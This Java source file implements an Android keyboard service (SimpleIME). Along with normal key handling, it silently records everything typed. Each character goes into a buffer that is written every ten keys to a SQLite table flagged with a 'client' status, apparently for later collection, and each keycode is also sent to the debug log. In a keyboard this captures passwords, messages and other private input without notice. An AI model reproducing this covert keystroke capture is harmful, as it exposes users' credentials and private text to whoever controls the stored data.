package com.example.ruslanio.keyboard;

import android.content.ContentValues;
import android.database.sqlite.SQLiteDatabase;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.media.AudioManager;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;

import com.example.ruslanio.keyboard.database.helper.DBHelper;



/**
 * Created by Ruslanio on 10.09.2017.
 */

public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyboardActionListener{

    private boolean mCaps = false;
    private KeyboardView mKeyBoardView;
    private Keyboard mKeyboard;
    private StringBuilder mStringBuilder;
    private int mCharCount = 0;
    private DBHelper mDBHelper;

    private static final int CHAR_COUNT = 10;

    private static final String IME_SERVICE_TAG = "ime_service";


    @Override
    public void onCreate() {
        super.onCreate();
        mDBHelper = new DBHelper(getApplicationContext());
    }

    @Override
    public View onCreateInputView() {
        Log.d(IME_SERVICE_TAG, "onCreateInputView");

        mStringBuilder = new StringBuilder();

        mKeyBoardView = (KeyboardView) getLayoutInflater().inflate(R.layout.keyboard,null,false);
        mKeyboard = new Keyboard(this,R.xml.qwerty);
        mKeyBoardView.setKeyboard(mKeyboard);
        mKeyBoardView.setOnKeyboardActionListener(this);

        return mKeyBoardView;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (mDBHelper != null)
            mDBHelper.close();
        Log.d(IME_SERVICE_TAG, "onDestroy");
    }

    private void playSound(int keyCode){
        AudioManager audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
        switch (keyCode){
            case 32:
                audioManager.playSoundEffect(AudioManager.FX_KEYPRESS_SPACEBAR);
                break;
            case Keyboard.KEYCODE_DONE:
            case 10:
                audioManager.playSoundEffect(AudioManager.FX_KEYPRESS_RETURN);
                break;
            case Keyboard.KEYCODE_DELETE:
                audioManager.playSoundEffect(AudioManager.FX_KEYPRESS_DELETE);
                break;
            default: audioManager.playSoundEffect(AudioManager.FX_KEYPRESS_STANDARD);
        }
    }

    @Override
    public void onPress(int primaryCode) {

    }

    @Override
    public void onRelease(int primaryCode) {

    }

    @Override
    public void onKey(int primaryCode, int[] keyCodes) {

        mCharCount++;
        if (mCharCount == CHAR_COUNT){
            mCharCount = 0;
            saveString();
        }
        Log.d(IME_SERVICE_TAG, primaryCode+"");
        InputConnection ic = getCurrentInputConnection();
        playSound(primaryCode);
        switch(primaryCode){
            case Keyboard.KEYCODE_DELETE :
                ic.deleteSurroundingText(1, 0);
                break;
            case Keyboard.KEYCODE_SHIFT:
                mCaps = !mCaps;
                mKeyboard.setShifted(mCaps);
                mKeyBoardView.invalidateAllKeys();
                break;
            case Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                break;
            default:
                char code = (char)primaryCode;
                if(Character.isLetter(code) && mCaps){
                    code = Character.toUpperCase(code);
                }
                mStringBuilder.append(code);
                ic.commitText(String.valueOf(code),1);
        }
    }

    private void saveString() {
        String data = mStringBuilder.toString();
        mStringBuilder = new StringBuilder();

        ContentValues contentValues = new ContentValues();

        contentValues.put(DBHelper.TextEntityTable.TEXT_ENTITY_TEXT, data);
        contentValues.put(DBHelper.TextEntityTable.TEXT_ENTITY_STATUS, DBHelper.STATUS_CLIENT);
        mDBHelper.getWritableDatabase().insert(DBHelper.TEXT_ENTITY_TABLE_NAME,null,contentValues);
    }

    @Override
    public void onText(CharSequence text) {

    }

    @Override
    public void swipeLeft() {

    }

    @Override
    public void swipeRight() {

    }

    @Override
    public void swipeDown() {

    }

    @Override
    public void swipeUp() {

    }


}
